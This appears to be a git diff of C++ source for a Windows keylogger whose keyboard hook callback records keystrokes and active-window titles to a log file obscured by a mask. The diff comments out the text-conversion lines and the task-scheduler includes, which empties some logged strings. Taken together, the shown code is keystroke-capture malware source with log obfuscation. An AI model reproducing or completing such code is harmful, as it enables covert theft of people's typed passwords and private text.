@@ -6,8 +6,8 @@
 #include <sstream>
 
 #include <windows.h>
-#include <taskschd.h>
-#include <comutil.h>
+//#include <taskschd.h>
+//#include <comutil.h>
 //#include <Psapi.h>
 //#include <comdef.h>
 #include <filesystem>
@@ -118,7 +118,7 @@ LRESULT KeyLogger::KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
 			{
 				std::u16string utf16Character = u"\n";
 				ApplyMask(&utf16Character);
-				std::string utf8Character = s_Utf16To8Converter.to_bytes(utf16Character);
+				std::string utf8Character;// = s_Utf16To8Converter.to_bytes(utf16Character);
 
 				s_LogFileStream << utf8Character << std::flush;
 			}
@@ -127,7 +127,7 @@ LRESULT KeyLogger::KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
 
 			std::u16string utf16Character = ParseChar((char16_t)kbStruct->vkCode);
 			ApplyMask(&utf16Character);
-			std::string utf8Character = s_Utf16To8Converter.to_bytes(utf16Character);
+			std::string utf8Character;// = s_Utf16To8Converter.to_bytes(utf16Character);
 
 			s_LogFileStream << utf8Character << std::flush;
 
@@ -277,12 +277,12 @@ void KeyLogger::LogCurrentWindowInfo()
 
 		// Convert string into u16string apply mask then convert it back, otherwise encryption wont work properly
 		std::string dateTimeStr = ss.str();
-		std::u16string dateTimeStrU16 = s_Utf8To16Converter.from_bytes(dateTimeStr);
+		std::u16string dateTimeStrU16;// = s_Utf8To16Converter.from_bytes(dateTimeStr);
 		ApplyMask(&dateTimeStrU16);
-		dateTimeStr = s_Utf16To8Converter.to_bytes(dateTimeStrU16);
+		//dateTimeStr = s_Utf16To8Converter.to_bytes(dateTimeStrU16);
 
 		ApplyMask(&winInfo);
-		std::string utf8WinInfo = s_Utf16To8Converter.to_bytes(winInfo);
+		std::string utf8WinInfo;// = s_Utf16To8Converter.to_bytes(winInfo);
 		s_LogFileStream << dateTimeStr << utf8WinInfo << std::flush;
 	}
 }
@@ -295,10 +295,10 @@ void KeyLogger::ReadFromFile()
 	std::string utf8String;
 	ifs >> utf8String;
 
-	std::u16string utf16String = s_Utf8To16Converter.from_bytes(utf8String);
+	std::u16string utf16String;// = s_Utf8To16Converter.from_bytes(utf8String);
 	ApplyMask(&utf16String);
 
-	utf8String = s_Utf16To8Converter.to_bytes(utf16String);
+	//utf8String = s_Utf16To8Converter.to_bytes(utf16String);
 	std::cout << utf8String << std::endl;
 }
 
@@ -632,6 +632,6 @@ uint16_t KeyLogger::s_EncodeMask;
 Timer KeyLogger::s_Timer;
 
 // Use a library instead of deprecated functions?
-std::wstring_convert<std::codecvt_utf8_utf16<char16_t>, char16_t> KeyLogger::s_Utf8To16Converter;
-std::wstring_convert<std::codecvt_utf8<char16_t>, char16_t> KeyLogger::s_Utf16To8Converter;
-std::wstring_convert<std::codecvt_utf8<wchar_t>> KeyLogger::s_WCharTo8ConverterWChar;
+// std::wstring_convert<std::codecvt_utf8_utf16<char16_t>, char16_t> KeyLogger::s_Utf8To16Converter;
+// std::wstring_convert<std::codecvt_utf8<char16_t>, char16_t> KeyLogger::s_Utf16To8Converter;
+// std::wstring_convert<std::codecvt_utf8<wchar_t>> KeyLogger::s_WCharTo8ConverterWChar;
